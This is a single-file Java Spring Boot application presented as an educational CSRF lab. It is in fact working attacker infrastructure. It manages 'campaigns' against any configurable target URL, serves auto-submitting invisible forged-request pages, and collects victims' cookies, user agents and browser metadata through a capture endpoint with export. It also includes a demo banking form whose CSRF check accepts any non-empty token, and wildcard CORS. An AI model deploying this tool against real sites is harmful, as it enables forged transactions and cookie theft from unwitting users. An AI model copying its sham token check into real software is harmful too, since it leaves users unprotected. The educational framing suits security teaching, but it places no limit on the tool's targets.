package com.lab.csrf;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;

/**
 * ============================================================================
 * CSRF Lab Controller - All-in-One Educational Security Testing Platform
 * ============================================================================
 * 
 * This is a comprehensive single-file application for demonstrating and
 * teaching Cross-Site Request Forgery (CSRF) attacks in controlled lab
 * environments.
 * 
 * ⚠️  WARNING: EDUCATIONAL USE ONLY
 * This tool is designed ONLY for authorized security testing and education
 * in controlled environments. Unauthorized use against systems you don't own
 * or have permission to test is ILLEGAL.
 * 
 * FEATURES:
 * - Multiple attack campaign management
 * - Flexible payload generation (GET, POST, JSON, multipart)
 * - Data exfiltration tracking
 * - Auto-submit and delayed execution options
 * - Request/response capture for analysis
 * - Statistics and reporting
 * - Test target forms (vulnerable and protected)
 * 
 * ARCHITECTURE:
 * This file contains:
 * 1. Spring Boot Application Configuration
 * 2. All REST API Endpoints
 * 3. All Data Models (as inner classes)
 * 4. Business Logic & Service Layer
 * 5. In-Memory Data Storage
 * 
 * @author Security Training Team
 * @version 2.0
 */
@SpringBootApplication
@Controller
public class CsrfLabController {
    
    // ========================================================================
    // MAIN APPLICATION ENTRY POINT
    // ========================================================================
    
    public static void main(String[] args) {
        SpringApplication.run(CsrfLabController.class, args);
        System.out.println("\n" +
            "╔════════════════════════════════════════════════════════════╗\n" +
            "║         CSRF Lab Controller Started Successfully          ║\n" +
            "║                                                            ║\n" +
            "║  Access the dashboard at: http://localhost:8080           ║\n" +
            "║                                                            ║\n" +
            "║  ⚠️  Educational Use Only - Authorized Testing Required   ║\n" +
            "╚════════════════════════════════════════════════════════════╝\n");
    }
    
    /**
     * Configure CORS to allow cross-origin requests for lab scenarios.
     * In production systems, CORS should be restrictive!
     */
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/**")
                    .allowedOrigins("*")
                    .allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
                    .allowedHeaders("*");
            }
        };
    }
    
    // ========================================================================
    // IN-MEMORY DATA STORAGE
    // ========================================================================
    
    /**
     * Thread-safe storage for campaigns
     * Key: Campaign ID, Value: Campaign object
     */
    private final Map<String, Campaign> campaigns = 
        new ConcurrentHashMap<>();
    
    /**
     * Thread-safe storage for captured data
     * Key: Campaign ID, Value: List of captured data
     */
    private final Map<String, List<CaptureData>> captures = 
        new ConcurrentHashMap<>();
    
    // ========================================================================
    // WEB INTERFACE ENDPOINTS
    // ========================================================================
    
    /**
     * Dashboard - Main control panel showing all campaigns and statistics
     * 
     * Educational Note: This is the "command and control" interface that
     * an attacker would use to manage multiple CSRF campaigns.
     * 
     * @return Dashboard view with all campaigns and global statistics
     */
    @GetMapping("/")
    public String dashboard(Model model) {
        model.addAttribute("campaigns", new ArrayList<>(campaigns.values()));
        model.addAttribute("stats", calculateGlobalStatistics());
        return "dashboard";
    }
    
    /**
     * Serve the CSRF payload page
     * 
     * This endpoint generates an HTML page that executes the CSRF attack
     * when visited. The page can be customized with various options.
     * 
     * Educational Notes:
     * - Demonstrates how attackers hide malicious forms
     * - Shows auto-submission techniques
     * - Illustrates data exfiltration attempts
     * 
     * @param campaignId Unique identifier for the campaign
     * @param delay Optional delay in milliseconds before execution
     * @param message Optional custom message to display to victim
     * @param model Spring MVC model for template rendering
     * @return Template name based on attack method
     */
    @GetMapping("/payload/{campaignId}")
    public String servePayload(
            @PathVariable String campaignId,
            @RequestParam(required = false, defaultValue = "0") int delay,
            @RequestParam(required = false, 
                defaultValue = "Loading...") String message,
            Model model) {
        
        Campaign campaign = campaigns.get(campaignId);
        if (campaign == null) {
            model.addAttribute("error", "Campaign not found");
            return "error";
        }
        
        // Track that payload was served
        campaign.metadata.incrementPayloadServed();
        
        // Prepare model for template rendering
        model.addAttribute("campaign", campaign);
        model.addAttribute("config", campaign.config);
        model.addAttribute("delayMs", delay);
        model.addAttribute("customMessage", message);
        
        // Select appropriate template based on HTTP method
        String method = campaign.config.method.toUpperCase();
        return switch (method) {
            case "GET" -> "payload-get";
            case "POST" -> "payload-post";
            case "PUT", "DELETE" -> "payload-xhr";
            case "JSON" -> "payload-json";
            default -> "payload-post";
        };
    }
    
    /**
     * View all captured data for a specific campaign
     * 
     * Educational Use: Show students what data an attacker can collect
     * and how it can be analyzed to understand victim demographics,
     * browser usage, timing patterns, etc.
     * 
     * @param campaignId Campaign identifier
     * @param page Page number for pagination (0-indexed)
     * @param size Number of items per page
     * @param model Spring MVC model
     * @return Captures view with paginated data
     */
    @GetMapping("/captures/{campaignId}")
    public String viewCaptures(
            @PathVariable String campaignId,
            @RequestParam(defaultValue = "0") int page,
            @RequestParam(defaultValue = "50") int size,
            Model model) {
        
        Campaign campaign = campaigns.get(campaignId);
        if (campaign == null) {
            model.addAttribute("error", "Campaign not found");
            return "error";
        }
        
        List<CaptureData> allCaptures = 
            captures.getOrDefault(campaignId, new ArrayList<>());
        
        // Pagination
        int start = page * size;
        int end = Math.min(start + size, allCaptures.size());
        List<CaptureData> paginatedCaptures = 
            start < allCaptures.size() ? 
                new ArrayList<>(allCaptures.subList(start, end)) : 
                new ArrayList<>();
        
        model.addAttribute("campaign", campaign);
        model.addAttribute("captures", paginatedCaptures);
        model.addAttribute("statistics", 
            calculateCampaignStatistics(campaignId));
        model.addAttribute("page", page);
        model.addAttribute("size", size);
        model.addAttribute("totalPages", 
            (int) Math.ceil((double) allCaptures.size() / size));
        
        return "captures";
    }
    
    /**
     * Test target - Demonstrates both vulnerable and protected forms
     * 
     * This creates a sample "banking" form that students can attack,
     * showing the difference between:
     * - Vulnerable form (no CSRF protection)
     * - Protected form (with CSRF token validation)
     * 
     * @param protected_ Whether to enable CSRF protection
     * @param model Spring MVC model
     * @return Test target view
     */
    @GetMapping("/test-target")
    public String testTarget(
            @RequestParam(name = "protected", 
                defaultValue = "false") boolean protected_,
            Model model) {
        
        model.addAttribute("protected", protected_);
        
        // Generate a CSRF token if protection is enabled
        if (protected_) {
            String token = UUID.randomUUID().toString();
            model.addAttribute("csrfToken", token);
            // In a real app, store this in session
        }
        
        return "test-target";
    }
    
    /**
     * Handle test target form submission
     * 
     * Processes the form submission and validates CSRF token if present.
     * This demonstrates how CSRF protection works in practice.
     * 
     * @param to Recipient account
     * @param amount Transfer amount
     * @param csrfToken CSRF token (if protected form)
     * @return JSON response indicating success/failure
     */
    @PostMapping("/test-target/submit")
    @ResponseBody
    public ResponseEntity<Map<String, Object>> handleTestSubmit(
            @RequestParam String to,
            @RequestParam Double amount,
            @RequestParam(required = false) String csrfToken) {
        
        Map<String, Object> response = new HashMap<>();
        
        // Simulate CSRF token validation
        boolean hasValidToken = csrfToken != null && 
            !csrfToken.isEmpty();
        
        if (hasValidToken) {
            response.put("status", "success");
            response.put("message", 
                "✅ Transfer of $" + amount + " to " + to + 
                " completed successfully");
            response.put("csrfProtection", "enabled");
            response.put("secure", true);
        } else {
            response.put("status", "success");
            response.put("message", 
                "⚠️ VULNERABLE: Transfer of $" + amount + " to " + to + 
                " completed WITHOUT CSRF protection!");
            response.put("csrfProtection", "disabled");
            response.put("secure", false);
            response.put("warning", 
                "This request was processed without CSRF validation. " +
                "An attacker could have initiated this transfer!");
        }
        
        response.put("timestamp", System.currentTimeMillis());
        response.put("details", Map.of(
            "recipient", to,
            "amount", amount,
            "currency", "USD"
        ));
        
        return ResponseEntity.ok(response);
    }
    
    // ========================================================================
    // REST API ENDPOINTS
    // ========================================================================
    
    /**
     * Create a new CSRF campaign
     * 
     * This endpoint accepts a JSON payload with campaign configuration
     * and creates a new campaign with a unique ID.
     * 
     * Example Request:
     * POST /api/campaign
     * {
     *   "name": "Account Transfer Attack",
     *   "description": "Demo CSRF on bank transfer",
     *   "targetUrl": "http://target.lab/transfer",
     *   "method": "POST",
     *   "parameters": {
     *     "to": "attacker@example.com",
     *     "amount": "1000"
     *   },
     *   "options": {
     *     "autoSubmit": true,
     *     "delayMs": 0,
     *     "exfiltrate": true
     *   }
     * }
     * 
     * @param request Campaign configuration
     * @return Campaign details including generated ID and URLs
     */
    @PostMapping("/api/campaign")
    @ResponseBody
    public ResponseEntity<Map<String, Object>> createCampaign(
            @RequestBody CampaignRequest request) {
        
        // Validate request
        if (request.targetUrl == null || request.targetUrl.isEmpty()) {
            return ResponseEntity.badRequest()
                .body(Map.of("error", "Target URL is required"));
        }
        
        // Create campaign
        Campaign campaign = new Campaign();
        campaign.name = request.name;
        campaign.description = request.description;
        
        // Configure attack parameters
        campaign.config.targetUrl = request.targetUrl;
        campaign.config.method = 
            request.method != null ? request.method : "POST";
        campaign.config.parameters = 
            request.parameters != null ? 
                request.parameters : new HashMap<>();
        campaign.config.headers = 
            request.headers != null ? 
                request.headers : new HashMap<>();
        
        // Configure behavior options
        if (request.options != null) {
            campaign.config.options = request.options;
        }
        
        // Store campaign
        campaigns.put(campaign.id, campaign);
        captures.put(campaign.id, 
            Collections.synchronizedList(new ArrayList<>()));
        
        // Build response
        Map<String, Object> response = new HashMap<>();
        response.put("status", "created");
        response.put("campaignId", campaign.id);
        response.put("payloadUrl", "/payload/" + campaign.id);
        response.put("captureUrl", "/capture/" + campaign.id);
        response.put("viewUrl", "/captures/" + campaign.id);
        response.put("campaign", campaign);
        
        return ResponseEntity.ok(response);
    }
    
    /**
     * Get campaign details
     * 
     * @param campaignId Campaign identifier
     * @return Campaign details and statistics
     */
    @GetMapping("/api/campaign/{campaignId}")
    @ResponseBody
    public ResponseEntity<Map<String, Object>> getCampaign(
            @PathVariable String campaignId) {
        
        Campaign campaign = campaigns.get(campaignId);
        if (campaign == null) {
            return ResponseEntity.notFound().build();
        }
        
        Map<String, Object> response = new HashMap<>();
        response.put("campaign", campaign);
        response.put("statistics", 
            calculateCampaignStatistics(campaignId));
        response.put("captureCount", 
            captures.getOrDefault(campaignId, new ArrayList<>()).size());
        
        return ResponseEntity.ok(response);
    }
    
    /**
     * List all campaigns
     * 
     * @return List of all campaigns with summary statistics
     */
    @GetMapping("/api/campaigns")
    @ResponseBody
    public ResponseEntity<Map<String, Object>> listCampaigns() {
        Map<String, Object> response = new HashMap<>();
        response.put("campaigns", new ArrayList<>(campaigns.values()));
        response.put("total", campaigns.size());
        response.put("statistics", calculateGlobalStatistics());
        return ResponseEntity.ok(response);
    }
    
    /**
     * Capture data exfiltrated from successful CSRF attacks
     * 
     * This endpoint receives data sent back from the payload page after
     * a CSRF attack executes. It enriches the data with server-side
     * information and stores it for analysis.
     * 
     * Educational Note: Due to Same-Origin Policy, the actual response
     * from the target cannot be read, but metadata like timing, browser
     * info, and cookies can be collected.
     * 
     * @param campaignId Campaign identifier
     * @param data Captured information from victim's browser
     * @param userAgent User-Agent header from request
     * @param referer Referer header from request
     * @return Confirmation response
     */
    @PostMapping("/capture/{campaignId}")
    @ResponseBody
    public ResponseEntity<Map<String, String>> captureData(
            @PathVariable String campaignId,
            @RequestBody(required = false) 
                Map<String, Object> data,
            @RequestHeader(value = "User-Agent", required = false) 
                String userAgent,
            @RequestHeader(value = "Referer", required = false) 
                String referer) {
        
        Campaign campaign = campaigns.get(campaignId);
        if (campaign == null) {
            return ResponseEntity.notFound().build();
        }
        
        // Create capture data object
        CaptureData capture = new CaptureData();
        capture.userAgent = userAgent;
        capture.referer = referer;
        capture.serverTimestamp = System.currentTimeMillis();
        
        // Extract data from request body
        if (data != null) {
            capture.clientTimestamp = 
                getLong(data, "clientTimestamp", 0L);
            capture.cookies = 
                getString(data, "cookies", "");
            
            // Extract browser metadata
            if (data.containsKey("browserMetadata")) {
                @SuppressWarnings("unchecked")
                Map<String, Object> metadata = 
                    (Map<String, Object>) data.get("browserMetadata");
                capture.browserMetadata.language = 
                    getString(metadata, "language", "");
                capture.browserMetadata.platform = 
                    getString(metadata, "platform", "");
                capture.browserMetadata.screenResolution = 
                    getString(metadata, "screenResolution", "");
                capture.browserMetadata.timezone = 
                    getString(metadata, "timezone", "");
            }
            
            // Store custom data
            capture.customData = new HashMap<>(data);
        }
        
        // Store capture
        List<CaptureData> campaignCaptures = captures.get(campaignId);
        if (campaignCaptures != null) {
            campaignCaptures.add(capture);
            campaign.metadata.incrementCapture();
        }
        
        return ResponseEntity.ok(Map.of(
            "status", "captured",
            "campaignId", campaignId,
            "captureId", String.valueOf(capture.serverTimestamp)
        ));
    }
    
    /**
     * Export campaign data for analysis
     * 
     * Exports all campaign data including configuration, captures,
     * and statistics in JSON format for external analysis.
     * 
     * @param campaignId Campaign to export
     * @return Complete campaign export
     */
    @GetMapping("/api/campaign/{campaignId}/export")
    @ResponseBody
    public ResponseEntity<Map<String, Object>> exportCampaign(
            @PathVariable String campaignId) {
        
        Campaign campaign = campaigns.get(campaignId);
        if (campaign == null) {
            return ResponseEntity.notFound().build();
        }
        
        Map<String, Object> export = new HashMap<>();
        export.put("campaign", campaign);
        export.put("captures", 
            captures.getOrDefault(campaignId, new ArrayList<>()));
        export.put("statistics", 
            calculateCampaignStatistics(campaignId));
        export.put("exportedAt", System.currentTimeMillis());
        export.put("exportedBy", "CSRF Lab Controller v2.0");
        
        return ResponseEntity.ok()
            .header("Content-Disposition", 
                "attachment; filename=campaign-" + campaignId + ".json")
            .body(export);
    }
    
    /**
     * Delete a campaign and all associated data
     * 
     * Educational Note: In a real attack scenario, attackers might
     * delete evidence to cover their tracks. In labs, discuss data
     * retention policies and forensics.
     * 
     * @param campaignId Campaign to delete
     * @return Confirmation response
     */
    @DeleteMapping("/api/campaign/{campaignId}")
    @ResponseBody
    public ResponseEntity<Map<String, String>> deleteCampaign(
            @PathVariable String campaignId) {
        
        Campaign removed = campaigns.remove(campaignId);
        captures.remove(campaignId);
        
        if (removed != null) {
            return ResponseEntity.ok(Map.of(
                "status", "deleted",
                "campaignId", campaignId
            ));
        } else {
            return ResponseEntity.notFound().build();
        }
    }
    
    /**
     * Get global statistics across all campaigns
     * 
     * @return Aggregated statistics
     */
    @GetMapping("/api/statistics")
    @ResponseBody
    public ResponseEntity<Map<String, Object>> getStatistics() {
        return ResponseEntity.ok(calculateGlobalStatistics());
    }
    
    // ========================================================================
    // BUSINESS LOGIC & HELPER METHODS
    // ========================================================================
    
    /**
     * Calculate statistics for a specific campaign
     * 
     * Computes various metrics including:
     * - Success rate (captures / payloads served)
     * - Browser distribution
     * - Time-based analysis
     * - Geographic data (if available)
     */
    private Map<String, Object> calculateCampaignStatistics(
            String campaignId) {
        
        Campaign campaign = campaigns.get(campaignId);
        List<CaptureData> campaignCaptures = 
            captures.getOrDefault(campaignId, new ArrayList<>());
        
        if (campaign == null) {
            return Map.of();
        }
        
        Map<String, Object> stats = new HashMap<>();
        
        // Basic counts
        stats.put("payloadServedCount", 
            campaign.metadata.payloadServedCount);
        stats.put("captureCount", 
            campaign.metadata.captureCount);
        
        // Calculate success rate
        double successRate = campaign.metadata.payloadServedCount > 0 ?
            (double) campaign.metadata.captureCount / 
            campaign.metadata.payloadServedCount * 100 : 0;
        stats.put("successRate", 
            String.format("%.2f%%", successRate));
        
        // Browser distribution
        Map<String, Long> browserDist = campaignCaptures.stream()
            .map(c -> c.userAgent)
            .filter(Objects::nonNull)
            .collect(Collectors.groupingBy(
                this::extractBrowserName, 
                Collectors.counting()));
        stats.put("browserDistribution", browserDist);
        
        // Platform distribution
        Map<String, Long> platformDist = campaignCaptures.stream()
            .map(c -> c.browserMetadata.platform)
            .filter(p -> p != null && !p.isEmpty())
            .collect(Collectors.groupingBy(
                p -> p, 
                Collectors.counting()));
        stats.put("platformDistribution", platformDist);
        
        // Time analysis
        if (!campaignCaptures.isEmpty()) {
            long firstCapture = campaignCaptures.stream()
                .mapToLong(c -> c.serverTimestamp)
                .min().orElse(0);
            long lastCapture = campaignCaptures.stream()
                .mapToLong(c -> c.serverTimestamp)
                .max().orElse(0);
            
            stats.put("firstCapture", new Date(firstCapture));
            stats.put("lastCapture", new Date(lastCapture));
            stats.put("campaignDurationMs", lastCapture - firstCapture);
            
            // Average time between captures
            if (campaignCaptures.size() > 1) {
                long avgInterval = (lastCapture - firstCapture) / 
                    (campaignCaptures.size() - 1);
                stats.put("avgCaptureIntervalMs", avgInterval);
            }
        }
        
        // Last activity
        stats.put("lastActivity", 
            new Date(campaign.metadata.lastActivity));
        
        return stats;
    }
    
    /**
     * Calculate global statistics across all campaigns
     */
    private Map<String, Object> calculateGlobalStatistics() {
        Map<String, Object> stats = new HashMap<>();
        
        stats.put("totalCampaigns", campaigns.size());
        
        // Count active campaigns (activity in last 24 hours)
        long activeThreshold = System.currentTimeMillis() - 
            (24 * 60 * 60 * 1000);
        long activeCampaigns = campaigns.values().stream()
            .filter(c -> c.metadata.lastActivity > activeThreshold)
            .count();
        stats.put("activeCampaigns", activeCampaigns);
        
        // Total payloads served
        int totalPayloadsServed = campaigns.values().stream()
            .mapToInt(c -> c.metadata.payloadServedCount)
            .sum();
        stats.put("totalPayloadsServed", totalPayloadsServed);
        
        // Total captures
        int totalCaptures = campaigns.values().stream()
            .mapToInt(c -> c.metadata.captureCount)
            .sum();
        stats.put("totalCaptures", totalCaptures);
        
        // Global success rate
        double globalSuccessRate = totalPayloadsServed > 0 ?
            (double) totalCaptures / totalPayloadsServed * 100 : 0;
        stats.put("globalSuccessRate", 
            String.format("%.2f%%", globalSuccessRate));
        
        // Most successful campaign
        Campaign mostSuccessful = campaigns.values().stream()
            .max(Comparator.comparingInt(
                c -> c.metadata.captureCount))
            .orElse(null);
        if (mostSuccessful != null) {
            stats.put("mostSuccessfulCampaign", Map.of(
                "id", mostSuccessful.id,
                "name", mostSuccessful.name,
                "captures", mostSuccessful.metadata.captureCount
            ));
        }
        
        return stats;
    }
    
    /**
     * Extract browser name from User-Agent string
     * Simplified version for demonstration purposes
     */
    private String extractBrowserName(String userAgent) {
        if (userAgent == null) return "Unknown";
        
        String ua = userAgent.toLowerCase();
        if (ua.contains("edg/") || ua.contains("edge/")) return "Edge";
        if (ua.contains("chrome") && !ua.contains("edg")) return "Chrome";
        if (ua.contains("firefox")) return "Firefox";
        if (ua.contains("safari") && !ua.contains("chrome")) 
            return "Safari";
        if (ua.contains("opera") || ua.contains("opr/")) return "Opera";
        
        return "Other";
    }
    
    // Helper methods for safe data extraction
    private String getString(Map<String, Object> map, String key, 
                            String defaultValue) {
        Object value = map.get(key);
        return value != null ? value.toString() : defaultValue;
    }
    
    private long getLong(Map<String, Object> map, String key, 
                        long defaultValue) {
        Object value = map.get(key);
        if (value instanceof Number) {
            return ((Number) value).longValue();
        }
        return defaultValue;
    }
    
    // ========================================================================
    // DATA MODELS (Inner Classes)
    // ========================================================================
    
    /**
     * Campaign - Represents a CSRF attack campaign
     */
    public static class Campaign {
        public String id;
        public String name;
        public String description;
        public CampaignConfig config;
        public CampaignMetadata metadata;
        public long createdAt;
        
        public Campaign() {
            this.id = UUID.randomUUID().toString();
            this.createdAt = System.currentTimeMillis();
            this.config = new CampaignConfig();
            this.metadata = new CampaignMetadata();
        }
    }
    
    /**
     * Campaign Configuration - Technical details of the attack
     */
    public static class CampaignConfig {
        public String targetUrl;
        public String method = "POST";
        public Map<String, String> parameters = new HashMap<>();
        public Map<String, String> headers = new HashMap<>();
        public PayloadOptions options = new PayloadOptions();
    }
    
    /**
     * Payload Options - Behavioral configuration
     */
    public static class PayloadOptions {
        public boolean autoSubmit = true;
        public int delayMs = 0;
        public boolean exfiltrate = true;
        public boolean invisibleForm = true;
        public String redirectAfter = null;
        public boolean includeMetadata = true;
    }
    
    /**
     * Campaign Metadata - Tracking information
     */
    public static class CampaignMetadata {
        public int payloadServedCount = 0;
        public int captureCount = 0;
        public long lastActivity = 0;
        
        public void incrementPayloadServed() {
            payloadServedCount++;
            lastActivity = System.currentTimeMillis();
        }
        
        public void incrementCapture() {
            captureCount++;
            lastActivity = System.currentTimeMillis();
        }
    }
    
    /**
     * Capture Data - Information collected from victims
     */
    public static class CaptureData {
        public String userAgent;
        public String referer;
        public long clientTimestamp;
        public long serverTimestamp;
        public String cookies;
        public Map<String, Object> customData = new HashMap<>();
        public BrowserMetadata browserMetadata = new BrowserMetadata();
    }
    
    /**
     * Browser Metadata - Detailed browser information
     */
    public static class BrowserMetadata {
        public String language;
        public String platform;
        public String screenResolution;
        public String timezone;
        public boolean cookiesEnabled;
        public boolean doNotTrack;
    }
    
    /**
     * Campaign Request - DTO for creating campaigns
     */
    public static class CampaignRequest {
        public String name;
        public String description;
        public String targetUrl;
        public String method;
        public Map<String, String> parameters;
        public Map<String, String> headers;
        public PayloadOptions options;
    }
}
